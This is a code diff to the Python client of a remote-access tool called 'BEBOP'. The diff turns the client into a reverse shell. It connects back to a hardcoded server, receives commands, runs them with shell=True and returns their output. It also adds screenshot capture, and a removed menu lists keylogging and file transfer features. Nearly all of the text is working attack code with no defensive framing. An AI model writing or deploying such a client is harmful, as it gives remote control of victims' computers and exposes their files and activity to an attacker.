@@ -3,15 +3,20 @@ import sys
 import os
 import time
 import subprocess
+import pyautogui
 
 ip = ""
 port = 0
 
+def take_screen_shot():
+    img = pyautogui.screenshot(time.asctime(time.localtime(time.time())))
+    
 
 def open_shell():
     while True:
-        data = server_con.recv(1024)
-        str_msg = ""
+        print("waiting for cmd...")
+        data = server_con.recv(4096)
+        str_msg = b""
 
         if data.decode() == "exit":
             break
@@ -20,17 +25,20 @@ def open_shell():
             try:
                 os.chdir(dir)
             except FileNotFoundError:
-                str_msg = 'No such file or directory: ' + dir.encode()
+                str_msg = b'No such file or directory: ' + dir.encode()
             else:
-                str_msg = os.getcwd()
+                str_msg = os.getcwd().encode()
         elif len(data.decode()) > 0:
-            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            str_msg = output.stdout.read().decode()
+            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            str_msg = output[0]
         else:
-            str_msg = "Error!"
-
-        server_con.sendall(str_msg.encode())
+            str_msg = b"Error!"
         
+        if not str_msg:
+            str_msg = b" "
+
+        server_con.sendall(str_msg)
+
 
 
 def establish_connection(address):
@@ -42,45 +50,27 @@ def establish_connection(address):
             server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_con.connect((address[0],address[1]))
             print(f"Connected!\nServer: {address[0]}:{address[1]}")
-            open_shell()
-            server_con.close()
         except ConnectionRefusedError:
-            print("Could not connect!")
-            time.sleep(5)
+            time.sleep(1)
         else:
             break
 
-def menu():
-    choice = 0
-
-    print("/-------BEBOP-------/\n")
-    print("1.) Open shell")
-    print("2.) Take screenshot")
-    print("3.) Begin screen stream")
-    print("4.) Keylogger")
-    print("5.) File upload/download")
-    print("6.) Exit\n\n")
-
-    while choice > 6 or choice < 1:
-        try:
-            choice = int(input("Enter choice: ")
-        except ValueError:
-            print("Enter a number between 1-6")
-    
-    print(choice)
             
 def main():
-    if len(sys.argv) < 2:
-        sys.exit("No Address specified")
-    else:
-        address = sys.argv[1].split(":")
-        if len(address) < 2:
-            sys.exit("Incorrect IP:PORT address.")
+    ip, port = "0.0.0.0", 3000 #address[0], int(address[1])
+    establish_connection((ip,port))
+    
+    while True:
+        choice = server_con.recv(1024).decode()
+        if choice == "1":
+            print("Opening Shell...")
+            open_shell()
+        elif choice == "2":
+            take_screen_shot()
+        elif choice == "6":
+            server_con.close()
+            sys.exit()
 
-        ip, port = address[0], int(address[1])
-    menu()
-    #establish_connection((ip,port))
-
+    server_con.close()
   
-
 main()
